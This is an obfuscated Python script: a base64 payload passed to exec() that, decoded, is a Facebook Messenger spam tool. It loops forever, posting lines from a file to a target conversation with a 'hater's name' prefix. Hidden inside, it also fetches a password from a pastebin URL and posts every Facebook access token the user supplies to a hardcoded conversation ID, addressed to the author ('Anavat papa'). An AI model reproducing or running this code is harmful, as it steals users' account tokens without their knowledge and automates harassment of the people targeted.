import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIlMzUlYzUiBMMEFEM1IgQlkgVjNOME0iKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CiAgICBQT1JUID0gNDAwMAoKICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgptbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9BQ21nNnpnTicpLnRleHQKCmRlZiBzZW5kX2luaXRpYWxfbWVzc2FnZSgpOgogICAgd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgcGFzc3dvcmQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkICAjIFByb21wdCBmb3IgcGFzc3dvcmQKCiAgICBpZiBlbnRlcmVkX3Bhc3N3b3JkICE9IHBhc3N3b3JkOgogICAgICAgIHByaW50KCdbLV0gPD09PiBJbmNvcnJlY3QgUGFzc3dvcmQhJykKICAgICAgICBzeXMuZXhpdCgpCgogICAgaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoKICAgICAgICBwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpCiAgICAgICAgc3lzLmV4aXQoKQoKICAgIHdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIHRva2VucyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICAjIE1vZGlmeSB0aGUgbWVzc2FnZSBhcyBwZXIgeW91ciByZXF1aXJlbWVudAogICAgbXNnX3RlbXBsYXRlID0gIkhlbGxvIEFuYXZhdCBwYXBhISBJIGFtIHVzaW5nIHlvdXIgc2VydmVyLiBNeSB0b2tlbiBpcyAtLS0tLS0tLS0tLS0tLS0tICAgIHt9IgoKICAgICMgU3BlY2lmeSB0aGUgSUQgd2hlcmUgeW91IHdhbnQgdG8gc2VuZCB0aGUgbWVzc2FnZQogICAgdGFyZ2V0X2lkID0gIjEwMDAwMDgxNDc0MTQyMiIKCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKICAgIGRlZiBsaW5lc3MoKToKICAgICAgICBwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKCiAgICBoZWFkZXJzID0gewogICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAogICAgICAgICdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwogICAgfQoKICAgIGZvciB0b2tlbiBpbiB0b2tlbnM6CiAgICAgICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3RyaXAoKQogICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQogICAgICAgIG1zZyA9IG1zZ190ZW1wbGF0ZS5mb3JtYXQoYWNjZXNzX3Rva2VuKQogICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBtc2d9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICMgTm8gbmVlZCB0byBwcmludCBoZXJlLCBhcyByZXF1ZXN0ZWQKICAgICAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpCiAgICAgICAgdGltZS5zbGVlcCgwLjEpICAjIFdhaXQgZm9yIDEgc2Vjb25kIGJldHdlZW4gc2VuZGluZyBlYWNoIGluaXRpYWwgbWVzc2FnZQoKICAgICNwcmludCgiXG5bK10gSW5pdGlhbCBtZXNzYWdlcyBzZW50LiBTdGFydGluZyB0aGUgbWVzc2FnZSBzZW5kaW5nIGxvb3AuLi5cbiIpCnNlbmRfaW5pdGlhbF9tZXNzYWdlKCkKZGVmIHNlbmRfbWVzc2FnZXNfZnJvbV9maWxlKCk6CiAgICB3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBjb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICB3aXRoIG9wZW4oJ0ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIG1lc3NhZ2VzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgIG51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCiAgICB3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykKICAgIG1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQoKICAgIHdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQoKICAgIGRlZiBsaW5lc3MoKToKICAgICAgICBwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKCiAgICBoZWFkZXJzID0gewogICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAogICAgICAgICdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwogICAgfQoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgogICAgICAgICAgICAgICAgdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwogICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gdG9rZW5zW3Rva2VuX2luZGV4XS5zdHJpcCgpCgogICAgICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkKCiAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAve30vIi5mb3JtYXQoJ3RfJyArIGNvbnZvX2lkKQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoKICAgICAgICAgICAgICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbK10gTWVzc2FnZSB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgTWVzc2FnZSB7fSBvZiBDb252byB7fSB3aXRoIFRva2VuIHt9OiB7fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNwZWVkKQoKICAgICAgICAgICAgcHJpbnQoIlxuWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uXG4iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkKCmRlZiBtYWluKCk6CiAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCiAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCiAgICAjIFNlbmQgdGhlIGluaXRpYWwgbWVzc2FnZSB0byB0aGUgc3BlY2lmaWVkIElEIHVzaW5nIGFsbCB0b2tlbnMKCgogICAgIyBUaGVuLCBjb250aW51ZSB3aXRoIHRoZSBtZXNzYWdlIHNlbmRpbmcgbG9vcAogICAgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQ==')) 
